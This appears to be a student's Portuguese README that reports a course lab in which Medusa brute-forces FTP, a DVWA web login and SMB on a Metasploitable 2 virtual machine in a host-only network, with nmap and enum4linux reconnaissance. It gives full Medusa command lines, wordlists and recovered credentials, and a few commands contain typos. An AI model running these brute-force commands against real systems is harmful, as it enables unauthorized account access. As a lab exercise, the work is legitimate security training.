# brute-force-medusa-DIO
Projeto prático de auditoria com Kali Linux e Medusa em ambientes controlados.

OBS: maior parte das etapas foram feitas durante as aulas, os comandos foram aplicados novamente e seu retorno detalhado.

OBJETIVOS:
  -Demonstrar o funcionamento da ferramenta Medusa.
  -Realizar experimentos controlados em FTP, Aplicações WEB e SMB.

FERRAMENTAS UTILIZADAS:
  -Kali Linux [Ambiente principal]
  -VirtualBox Oracle [Virtualização]
  -Metasploitable 2 [Sistema Vulnerável - FTP, SMB]
  -DVWA [Aplicação Web Vulnerável]
  -Medusa [Brute Force]
  -Nmap [Reconhecer Portas]

CONFIGURAÇÕES NA VIRTUAL BOX:
  -Ambas virtualizações com 2GB de Memória RAM
  -Redes do Metasploitable 2 e Kali Linux configuradas para Placa de Rede Exclusiva para Hospedeiro.

-------------------------------------------------------------------------------------------------------

1. IDENTIFICAÇÃO DOS ENDEREÇOS IP:

No terminal de comandos do Kali Linux, usei o ```ip addr```, que me retornou o endereço de ip 192.168.56.101
No metasploitable 2 usei o ```ifconfig```, e o ip identificado foi 192.168.56.102 

1.1 VERIFICANDO A CONEXÃO

Foi realizado um teste de conectividade entre o host atacante e o alvo, em que o comando ```ping -c 4 192.168.56.102``` foi aplicado, e retornou:
```
PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=172 ms
64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=1.32 ms
64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=1.20 ms
64 bytes from 192.168.56.102: icmp_seq=4 ttl=64 time=1.31 ms

--- 192.168.56.102 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3012ms
rtt min/avg/max/mdev = 1.200/43.934/171.916/73.890 ms
```
O resultado confirma a comunicação entre os dois hosts por meio do icmp.

1.2 PRIMEIRA TENTATIVA DE MAPEIAMENTO COM Nmap:

Aplicamos o ```nmap -sn 192.168.56.102```, em que eu chamo o nmap, coloco a flag -sn (verificar se o host está ativo) e o ip do host alvo. Durante a execução, foi observada uma lentidão na etapa de resolução de DNS, aí eu resolvi pular a resolução de DNs usando a flag -n, e o comando ficou ```nmap -sn -n 192.168.56.102```, que retornou:
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-09 10:31 -0500
Nmap scan report for 192.168.56.102
Host is up (0.0033s latency).
MAC Adress: 08:00:27:94:7C:DC (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP adress (1 host up) scanned in 0.27 seconds
```
Foi confirmado que existe host aberto.

1.3 IDENTIFICAÇÃO DAS PORTAS:

Após a confirmação, foi realizada uma varredura com o comando ```sudo nmap -n 192.168.56.102```, que retornou várias portas abertas, mas eu decidi fazer novamente especificando quais portas eu queria que ele retornasse, o comando foi alterado para ```sudo nmap -n -p 21,22,80,445,139``` que retornou:
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-09 10:39 -0500
Nmap scan report for 192.168.56.102
Host is up (0.0017s latency).

PORT  STATE  SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp  open  netbios-ssn
445/tcp open  microsoft-ds
MAC Adress: 08:00:27:94:7C:DC (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP adress (1 host up) scanned in 1.28 seconds.
```

1.4 MEDUSA - FTP:

Eu já havia realizado essa prática durante as aulas na DIO, mas vou explicar certas etapas:
A porta 21/tcp do FTP estava aberta, aí fiz uma verificação de conexão usando ```ftp 192.168.56.102```, que deveria retornar uma requisição de senha, mas como eu já tenho acesso ele retorna:
```
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:kali):
```
A partir daí, eu criei as wordlists que seriam usadas pelo Medusa durante o ataque de força bruta. Esses arquivos poderiam ser criados tanto pela área de trabalho quanto pelo terminal. Para a lista de usuários ```echo -e "user\msfadmin\qwerty\nroot" > usr.txt```, para a lista de senhas ```echo -e "123456\npassword\nqwerty\nmsfadmin\msfadmin" > pass.txt```. Eu usei o ```cat``` para verificar o que estava contido nos arquivos e vi que haviam algumas combinações que estavam coladas uma nas outras, como user\msfadmin, aí eu arrumei usando o ```nano```.

Por fim, eu finalmente apliquei o Medusa, usando ```medusa -h 192.168.56.102 -U usr.txt -P pass.txt -M ftp -t 6```, em que o -h identifica qual host será o alvo, o -U informa qual wordlist será usada para os usuários, -P para dizer qual wordlist será usada para as senhas, o -M para especificar o módulo e o -t para relatar quantos threads. Foi retornado uma série de tentativas, mas somente uma é válida:
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCESS]
```
Após isso, voltei ao ```fpt 192.162.56.102``` e coloquei o resultado do Medusa (usuário e senha) que obteve sucesso e consegui o acesso ao host alvo (Metasploitable 2).

2. MEDUSA - APLICAÇÕES WEB

Essa etapa vai servir para aplicações web, na etapa 1.3 o Nmap confirmou que a porta 80 estava aberta (http). Eu abri o Firefox e digitei na URL ```192.168.56.102/dvwa/login.php``` que nos leva ao site da DVWA que é uma página de login propositalmente vulnerável. Eu precisava descobrir os parâmetros de usuário e senha, na parte de login eu coloquei qualquer coisa (Usuário: stark Senha: 123S) e retornou uma mensagem de falha no login. Eu apertei a tecla F12 que inicializa a DevTools na página, fui na aba Network que apresentou métodos GET e POST, eu cliquei no POST e em REQUESTS que exibiu os parâmetros:
```
username: "stark"
password: "123S"
Login: "Login"
```
Com isso, eu podia montar o comando.

```
medusa -h 192.168.56.102 -U usr.txt -P pass.txt -M ftp -t 6 \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
Em que ambas as wordlists foram aproveitadas, o PAGE para demonstrar a página que recebe, o FORM para demonstrar os parâmetros e o FAIL para indicar falha de login, foram retornadas possíveis credenciais:
```
ACCOUNT FOUND [http] Host: 192.168.56.102 User: user Password: nmsfadmin [SUCESS]
ACCOUNT FOUND [http] Host: 192.168.56.102 User: user Password: nqwerty [SUCESS]
ACCOUNT FOUND [http] Host: 192.168.56.102 User: user Password: npassword [SUCESS]
ACCOUNT FOUND [http] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCESS]
```

3. MEDUSA - SMB

O Nmap também confrimou que as portas 139 e 455 estão abertas, primeiro eu usei a ferramenta enum4linux, usando esse comando ```enum4linux -a 192.168.56.102 | tee  enum4_output.txt``` que retornou uma cadeia de informações, mas o foco foi nos usuários (nobody, msfadmin, news) que foram adicionados ao usr.txt. Usando novamente o Medusa, utilizei o comando ```medusa -h 192.168.56.102 -U usr.txt -P pass.txt -M smbnt -t 4```, que retornou:
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCESS (ADMIN$ - Acess Allowed)]
```
E fiz a validação manual usando ```smbclient -L //192.168.56.102 -U msfadmin``` e logo após a senha ```msfadmin```.

ENCERRAMENTO:

Esse foi meu relatório desses experimentos práticos, eu gostei bastante de ter tido essa experiência com os ambientes e as ferramentas e estou satisfeito com o resultado e ter concluído esse projeto.
  -**Orlando Neto**
